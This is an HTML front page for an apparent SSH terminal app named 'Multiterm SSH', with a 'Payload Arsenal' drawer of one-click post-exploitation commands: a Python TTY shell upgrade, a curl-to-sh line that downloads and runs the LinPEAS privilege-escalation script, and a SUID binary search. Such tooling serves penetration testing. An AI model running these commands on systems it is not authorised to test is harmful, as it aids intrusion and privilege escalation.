<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="stylesheet" href="/src/styles.css" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Multiterm SSH</title>
    <script type="module" src="/src/main.ts" defer></script>
  </head>
  <body>
    <div id="app-container">
      <div id="terminal-container"></div>
      <div id="payload-drawer" class="hidden">
        <h3>Payload Arsenal</h3>
        <ul>
          <li data-payload="python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'">Python TTY Upgrade</li>
          <li data-payload="curl -L http://linpeas.sh | sh">LinPEAS</li>
          <li data-payload="find / -perm -u=s -type f 2>/dev/null">Find SUID Binaries</li>
        </ul>
      </div>
      <div id="settings-drawer" class="hidden">
        <h3>Settings</h3>
        <div class="setting-item">
          <label for="bg-color-picker">Background Color</label>
          <input type="color" id="bg-color-picker" value="#1e1e1e" />
        </div>
      </div>
    </div>
  </body>
</html>
